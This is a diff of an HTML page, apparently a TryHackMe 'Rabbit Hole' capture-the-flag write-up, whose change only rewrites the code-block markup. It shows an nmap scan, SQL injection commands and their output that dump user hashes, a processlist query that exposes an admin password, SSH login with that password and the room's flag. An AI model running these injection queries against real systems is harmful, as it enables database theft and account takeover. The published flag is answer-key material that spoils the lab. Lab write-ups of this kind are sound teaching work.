@@ -124,69 +124,69 @@
             <blockquote>
 <p>Using nmap againes to rabit.thm find,</p>
 </blockquote>
-<div class="codehilite"><pre><span></span><code><span class="err">❯</span><span class="w"> </span><span class="nt">nmap</span><span class="w"> </span><span class="nt">rabit</span><span class="p">.</span><span class="nc">thm</span>
-<span class="nt">Starting</span><span class="w"> </span><span class="nt">Nmap</span><span class="w"> </span><span class="nt">7</span><span class="p">.</span><span class="nc">95</span><span class="w"> </span><span class="o">(</span><span class="w"> </span><span class="nt">https</span><span class="o">://</span><span class="nt">nmap</span><span class="p">.</span><span class="nc">org</span><span class="w"> </span><span class="o">)</span><span class="w"> </span><span class="nt">at</span><span class="w"> </span><span class="nt">2025-10-09</span><span class="w"> </span><span class="nt">06</span><span class="p">:</span><span class="nd">16</span><span class="w"> </span><span class="nt">EDT</span>
-<span class="nt">Stats</span><span class="o">:</span><span class="w"> </span><span class="nt">0</span><span class="p">:</span><span class="nd">05</span><span class="p">:</span><span class="nd">07</span><span class="w"> </span><span class="nt">elapsed</span><span class="o">;</span><span class="w"> </span><span class="nt">0</span><span class="w"> </span><span class="nt">hosts</span><span class="w"> </span><span class="nt">completed</span><span class="w"> </span><span class="o">(</span><span class="nt">1</span><span class="w"> </span><span class="nt">up</span><span class="o">),</span><span class="w"> </span><span class="nt">1</span><span class="w"> </span><span class="nt">undergoing</span><span class="w"> </span><span class="nt">SYN</span><span class="w"> </span><span class="nt">Stealth</span><span class="w"> </span><span class="nt">Scan</span>
-<span class="nt">SYN</span><span class="w"> </span><span class="nt">Stealth</span><span class="w"> </span><span class="nt">Scan</span><span class="w"> </span><span class="nt">Timing</span><span class="o">:</span><span class="w"> </span><span class="nt">About</span><span class="w"> </span><span class="nt">94</span><span class="p">.</span><span class="nc">00</span><span class="o">%</span><span class="w"> </span><span class="nt">done</span><span class="o">;</span><span class="w"> </span><span class="nt">ETC</span><span class="o">:</span><span class="w"> </span><span class="nt">06</span><span class="p">:</span><span class="nd">22</span><span class="w"> </span><span class="o">(</span><span class="nt">0</span><span class="p">:</span><span class="nd">00</span><span class="p">:</span><span class="nd">20</span><span class="w"> </span><span class="nt">remaining</span><span class="o">)</span>
-<span class="nt">Nmap</span><span class="w"> </span><span class="nt">scan</span><span class="w"> </span><span class="nt">report</span><span class="w"> </span><span class="nt">for</span><span class="w"> </span><span class="nt">rabit</span><span class="p">.</span><span class="nc">thm</span><span class="w"> </span><span class="o">(</span><span class="nt">10</span><span class="p">.</span><span class="nc">201</span><span class="p">.</span><span class="nc">85</span><span class="p">.</span><span class="nc">14</span><span class="o">)</span>
-<span class="nt">Host</span><span class="w"> </span><span class="nt">is</span><span class="w"> </span><span class="nt">up</span><span class="w"> </span><span class="o">(</span><span class="nt">0</span><span class="p">.</span><span class="nc">79s</span><span class="w"> </span><span class="nt">latency</span><span class="o">).</span>
-<span class="nt">Not</span><span class="w"> </span><span class="nt">shown</span><span class="o">:</span><span class="w"> </span><span class="nt">996</span><span class="w"> </span><span class="nt">closed</span><span class="w"> </span><span class="nt">tcp</span><span class="w"> </span><span class="nt">ports</span><span class="w"> </span><span class="o">(</span><span class="nt">reset</span><span class="o">)</span>
-<span class="nt">PORT</span><span class="w">     </span><span class="nt">STATE</span><span class="w">    </span><span class="nt">SERVICE</span>
-<span class="nt">7</span><span class="o">/</span><span class="nt">tcp</span><span class="w">    </span><span class="nt">filtered</span><span class="w"> </span><span class="nt">echo</span>
-<span class="nt">22</span><span class="o">/</span><span class="nt">tcp</span><span class="w">   </span><span class="nt">open</span><span class="w">     </span><span class="nt">ssh</span>
-<span class="nt">80</span><span class="o">/</span><span class="nt">tcp</span><span class="w">   </span><span class="nt">open</span><span class="w">     </span><span class="nt">http</span>
-<span class="nt">1102</span><span class="o">/</span><span class="nt">tcp</span><span class="w"> </span><span class="nt">filtered</span><span class="w"> </span><span class="nt">adobeserver-1</span>
-</code></pre></div>
+<pre class="codehilite"><code>❯ nmap rabit.thm
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-09 06:16 EDT
+Stats: 0:05:07 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 94.00% done; ETC: 06:22 (0:00:20 remaining)
+Nmap scan report for rabit.thm (10.201.85.14)
+Host is up (0.79s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT     STATE    SERVICE
+7/tcp    filtered echo
+22/tcp   open     ssh
+80/tcp   open     http
+1102/tcp filtered adobeserver-1
+</code></pre>
 
 <blockquote>
 <p>So using http find login forum and use some Scripts</p>
 <p>[[https://github.com/mhsn1/RabbitHole-THM-Writeup.git]]</p>
 </blockquote>
-<div class="codehilite"><pre><span></span><code>❯ ./sqli_automate2.py &#39;http://rabit.thm/&#39; &#39;SELECT group_concat(schema_name) FROM information_schema.schemata&#39;
+<pre class="codehilite"><code>❯ ./sqli_automate2.py 'http://rabit.thm/' 'SELECT group_concat(schema_name) FROM information_schema.schemata'
 
 information_schema,web
-</code></pre></div>
+</code></pre>
 
-<div class="codehilite"><pre><span></span><code>❯ python3 sqli_automate2.py &#39;http://rabit.thm/&#39; &#39;SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=&quot;web&quot;&#39;
+<pre class="codehilite"><code>❯ python3 sqli_automate2.py 'http://rabit.thm/' 'SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=&quot;web&quot;'
 users,logins
-</code></pre></div>
+</code></pre>
 
-<div class="codehilite"><pre><span></span><code>❯ python3 sqli_automate2.py &#39;http://rabit.thm/&#39; &#39;SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=&quot;web&quot; AND table_name=&quot;users&quot;&#39;
+<pre class="codehilite"><code>❯ python3 sqli_automate2.py 'http://rabit.thm/' 'SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=&quot;web&quot; AND table_name=&quot;users&quot;'
 id,username,password,group
-</code></pre></div>
+</code></pre>
 
-<div class="codehilite"><pre><span></span><code><span class="n">❯</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="n">sqli_automate2</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="s1">&#39;http://rabit.thm/&#39;</span><span class="w"> </span><span class="s1">&#39;SELECT group_concat(id,&quot;:&quot;,username,&quot;:&quot;,password,&quot;:&quot;,`group` SEPARATOR &quot;</span><span class="se">\n</span><span class="s1">&quot;) FROM web.users WHERE id&lt;4&#39;</span>
-<span class="mi">1</span><span class="o">:</span><span class="k">admin</span><span class="o">:</span><span class="mf">0e3</span><span class="n">ab8e45ac1163c2343990e427c66ff</span><span class="o">:</span><span class="k">admin</span>
-<span class="mi">2</span><span class="o">:</span><span class="n">foo</span><span class="o">:</span><span class="n">a51e47f646375ab6bf5dd2c42d3e6181</span><span class="o">:</span><span class="n">guest</span>
-<span class="mi">3</span><span class="o">:</span><span class="n">bar</span><span class="o">:</span><span class="n">de97e75e5b4604526a2afaed5f5439d7</span><span class="o">:</span><span class="n">guest</span>
-</code></pre></div>
+<pre class="codehilite"><code>❯ python3 sqli_automate2.py 'http://rabit.thm/' 'SELECT group_concat(id,&quot;:&quot;,username,&quot;:&quot;,password,&quot;:&quot;,`group` SEPARATOR &quot;\n&quot;) FROM web.users WHERE id&lt;4'
+1:admin:0e3ab8e45ac1163c2343990e427c66ff:admin
+2:foo:a51e47f646375ab6bf5dd2c42d3e6181:guest
+3:bar:de97e75e5b4604526a2afaed5f5439d7:guest
+</code></pre>
 
-<div class="codehilite"><pre><span></span><code>❯ python3 processlist_extractor.py &#39;http://rabit.thm/&#39; &#39;SELECT INFO_BINARY FROM information_schema.PROCESSLIST WHERE INFO_BINARY NOT LIKE &quot;%INFO_BINARY%&quot; LIMIT 1&#39;
+<pre class="codehilite"><code>❯ python3 processlist_extractor.py 'http://rabit.thm/' 'SELECT INFO_BINARY FROM information_schema.PROCESSLIST WHERE INFO_BINARY NOT LIKE &quot;%INFO_BINARY%&quot; LIMIT 1'
 
-SELECT * from users where (username= &#39;admin&#39; and password=md5(&#39;fEeFBqOXBOLmjpTt0B3LNpuwlr7mJxI9dR8kgTpbOQcLlvgmoCt35qogicf8ao0Q&#39;) ) UNION ALL SELECT null,null,null,SLEEP(5) LIMIT 2
-</code></pre></div>
+SELECT * from users where (username= 'admin' and password=md5('fEeFBqOXBOLmjpTt0B3LNpuwlr7mJxI9dR8kgTpbOQcLlvgmoCt35qogicf8ao0Q') ) UNION ALL SELECT null,null,null,SLEEP(5) LIMIT 2
+</code></pre>
 
-<div class="codehilite"><pre><span></span><code><span class="n">ssh</span><span class="w"> </span><span class="k">admin</span><span class="nv">@rabit</span><span class="p">.</span><span class="n">thm</span>
+<pre class="codehilite"><code>ssh admin@rabit.thm
 
-<span class="n">Password</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">fEeFBqOXBOLmjpTt0B3LNpuwlr7</span><span class="c1">---------------------------</span>
-</code></pre></div>
+Password - fEeFBqOXBOLmjpTt0B3LNpuwlr7---------------------------
+</code></pre>
 
-<div class="codehilite"><pre><span></span><code><span class="err">❯</span><span class="w"> </span><span class="n">ssh</span><span class="w"> </span><span class="k">admin</span><span class="nv">@rabit</span><span class="p">.</span><span class="n">thm</span>
-<span class="n">The</span><span class="w"> </span><span class="n">authenticity</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="k">host</span><span class="w"> </span><span class="s1">&#39;rabit.thm (10.201.85.14)&#39;</span><span class="w"> </span><span class="n">can</span><span class="s1">&#39;t be established.</span>
-<span class="s1">ED25519 key fingerprint is SHA256:Isaoxan2d+XFoXmwu4RWDMAjr+A4MZGLPoacIxv/gSc.</span>
-<span class="s1">This key is not known by any other names.</span>
-<span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span>
-<span class="s1">Warning: Permanently added &#39;</span><span class="n">rabit</span><span class="p">.</span><span class="n">thm</span><span class="s1">&#39; (ED25519) to the list of known hosts.</span>
-<span class="s1">admin@rabit.thm&#39;</span><span class="n">s</span><span class="w"> </span><span class="nl">password</span><span class="p">:</span><span class="w"> </span>
-<span class="k">To</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">administrator</span><span class="w"> </span><span class="p">(</span><span class="k">user</span><span class="w"> </span><span class="ss">&quot;root&quot;</span><span class="p">),</span><span class="w"> </span><span class="k">use</span><span class="w"> </span><span class="ss">&quot;sudo &lt;command&gt;&quot;</span><span class="p">.</span>
-<span class="n">See</span><span class="w"> </span><span class="ss">&quot;man sudo_root&quot;</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">details</span><span class="p">.</span>
+<pre class="codehilite"><code>❯ ssh admin@rabit.thm
+The authenticity of host 'rabit.thm (10.201.85.14)' can't be established.
+ED25519 key fingerprint is SHA256:Isaoxan2d+XFoXmwu4RWDMAjr+A4MZGLPoacIxv/gSc.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'rabit.thm' (ED25519) to the list of known hosts.
+admin@rabit.thm's password: 
+To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
+See &quot;man sudo_root&quot; for details.
 
-<span class="k">admin</span><span class="nv">@ubuntu</span><span class="o">-</span><span class="nl">jammy</span><span class="p">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span>
-<span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
-<span class="k">admin</span><span class="nv">@ubuntu</span><span class="o">-</span><span class="nl">jammy</span><span class="p">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
-<span class="n">THM</span><span class="err">{</span><span class="n">this_is_the_way_step_inside_jNu8uJ9tvKfH1n48</span><span class="err">}</span>
-<span class="k">admin</span><span class="nv">@ubuntu</span><span class="o">-</span><span class="nl">jammy</span><span class="p">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span>
-</code></pre></div>
+admin@ubuntu-jammy:~$ ls
+flag.txt
+admin@ubuntu-jammy:~$ cat flag.txt
+THM{this_is_the_way_step_inside_jNu8uJ9tvKfH1n48}
+admin@ubuntu-jammy:~$ 
+</code></pre>
         </div>
     </main>
 
